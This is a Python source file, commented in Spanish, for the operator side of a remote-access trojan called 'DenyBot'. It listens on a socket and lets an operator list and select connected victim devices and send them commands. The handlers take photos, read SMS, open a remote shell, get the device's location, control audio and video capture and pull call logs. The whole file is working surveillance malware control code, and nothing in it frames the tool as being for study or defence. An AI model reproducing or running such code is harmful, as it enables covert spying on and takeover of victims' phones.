import socket
import sys
import threading
import time
from utils import *
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Se crea el socket 
def create_socket():
    try:
        # Declaramos variables globales
        global host
        global port
        global s
        # Se asigna la ip de la pc servidor
        host = "192.168.100.62"
        # Se utiliza el puerto de acceso 9999 
        port = 9999
        # Se instancia la conexion
        s = socket.socket()

    except socket.error as msg:
        # Se muestra el error en caso de que exista uno
        print("Socket creation error: " + str(msg))


def bind_socket():
    try:
        # Llamamos a las variabels globales
        global host
        global port
        global s
        print("Binding the Port: " + str(port))
        # se utiliza para asociar el conector con la dirección del servidor
        s.bind((host, port))
        # Se pone el socket en escucha
        s.listen(5)

    except socket.error as msg:
        # Se muestra el error en caso de que exista uno
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        # Se vuelve a intentar la conexion
        bind_socket()


def accepting_connections():
    # Antes de seguir se cierra todas las conexiones que se crearon
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            # Acepta la conexion y recupera una variable de conexion y la direccion
            conn, address = s.accept()
            s.setblocking(1)  # previene un posible timeput
            # Guardamos las conexiones y su IP
            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            # Se muestra el error en caso de que exista uno
            print("Error accepting connections")


# 2nd hilo de funciones - 1) Muestra todos los clientes 2) Selecciona el cliente 3) Envia los comandos
# Interactive prompt for sending commands
# DenyBot> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# DenyBot> select 1
# 192.168.0.112> dir


def start_turtle():

    while True:
        # Se procede a acceder a la terminal del bot
        cmd = input('DenyBot> ')
        # En caso de escribir list se muestra el listado de dispositivos
        if cmd == 'list':
            list_connections()    
        elif 'select' in cmd:
            #Se recupera la conexion previamente seleccionada
            conn = get_target(cmd)
            if conn is not None:
                # En caso de lograr recuperar la conexion se permite enviar comandos
                send_target_commands(conn)
                start_turtle()
        elif 'exit' in cmd:   
            # Se rompe el ciclo
            break     
        else:
            print("Command not recognized")


# Se muestra el listado de todos los clientes activos
def list_connections():
    results = ''
    # Se crea un ciclo en el cual se recorre las conexiones previamente encontradas
    for i, conn in enumerate(all_connections):
        try:
            # Se prueba la conexion enviando y recibiendo datos
            conn.send(str.encode(' '))
            #conn.recv(20480)
        except:
            # En caso de no generar conexion se la borra de la lista
            del all_connections[i]
            del all_address[i]
            continue            
        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecciona uno de los dispositivos
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # Se saca el id ingresado
        target = int(target)
        # Se recupera la conexion seleccionada
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        # Se ingresa a la terminal seleccionada
        #print(str(all_address[target][0]) + ">", end="")
        # Se retorna la conexion
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Se envia los mensajes entre cliente servidor
def send_target_commands(conn):
    while True:
        #try:
        # Se pone en escucha el socket
        msg = conn.recv(4024).decode("UTF-8")
        # Estas son las acciones a realizar como respuesta 
        # del mensaje que mandemos
        if(msg.strip() == "IMAGE"):
            getImage(conn)
        elif("readSMS" in msg.strip()):
            content = msg.strip().split(" ")
            data = content[1]
            readSMS(conn,data)
        elif(msg.strip() == "SHELL"):
            shell(conn)
        elif(msg.strip() == "getLocation"):
            getLocation(conn)
        elif(msg.strip() == "stopVideo123"):
            stopVideo(conn)
        elif(msg.strip() == "stopAudio"):
            stopAudio(conn)
        elif(msg.strip() == "callLogs"):
            callLogs(conn)
        elif(msg.strip() == "help"):
            help()
        else:
            print(msg)
        # Caputramos los datos escritos    
        cmd = input(Style.BRIGHT+Fore.CYAN+"Interpreter:/> "+Fore.RESET)+"\n"
       
        # Se envia el mensaje
        conn.send(cmd.encode("UTF-8"))
        # En caso de querer terminar 
        if cmd.strip() == "exit":
            print(" ")
            print("Bye")
            sys.exit()
        if(cmd.strip() == "clear"):clear()
        """ except:
            # Mostramos el error
            print("Error sending commands")
            break """


# Creamos los hilos para los subprocesos
def create_workers():
    # Se crean los hilos de ejecucion 
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# En la siguientes funcion ponemos en marcha la cola de
# procesos (handle connections, send commands)
def work():
    while True:
        # Guardamos la cola para los procesos
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()
        # Se marca los procesos terminados
        queue.task_done()


def create_jobs():
    # Se crea los trabajos a iniciar en la cola
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
